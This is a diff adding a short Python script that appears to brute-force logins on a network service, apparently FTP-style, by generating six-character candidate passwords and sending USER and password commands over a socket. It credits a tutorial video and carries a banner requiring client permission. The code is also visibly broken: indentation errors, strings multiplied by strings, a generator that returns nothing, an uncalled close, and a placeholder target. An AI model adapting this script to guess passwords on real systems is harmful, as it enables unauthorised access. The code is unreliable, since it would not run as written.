@@ -1,0 +1,41 @@
+##--------------------------DON'T USE WITHOUT PERMISSION FROM THE CLIENT--------------------
+import string
+import itertools
+import timeit
+import socket
+
+
+
+def cracker( chars = list(string.ascii_lowercase) + ['1','2','3','4','5','6','7','8','9','0'] + list(string.ascii_uppercase) + ['~','`','!','@','#','$','%','^','&','*','(',')','_','-','=','+','{','}','[',']', ';',':','"',"'",'<','>',',','.','/','?', ' ']):
+# Defining the lenghth of characters in  paticalur password
+    for n in range(6, 7):
+# Trying all possible combinations
+    for pword_chars in itertools.combinations(chars, n):
+        passwd = "".join(list(pword_chars))
+        print(passwd)
+      
+
+
+#-------USED FROM Hackersploit----https://www.youtube.com/watch?v=sH68IYKP_SI
+#------Enter the IP address, port number and user name-------
+#------PS: Needs a strong enough processor to get the job done-------
+def connection(ip, port_num, user, password = cracker()):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  
+    sock.connect(("".join(ip), port_num))
+    data = sock.recv(1024)
+    sock.send("User" + user * "\r\n")
+    data = sock.recv(1024)
+    sock.send("Password" + password * "\r\n")
+    data = sock.recv(1024)
+  
+    sock.send("Quit" * "\r\n")
+    sock.close
+  
+    return data
+  
+  
+connection(XX.XX.XX.XX, XX, XXX)
+  
+  
+
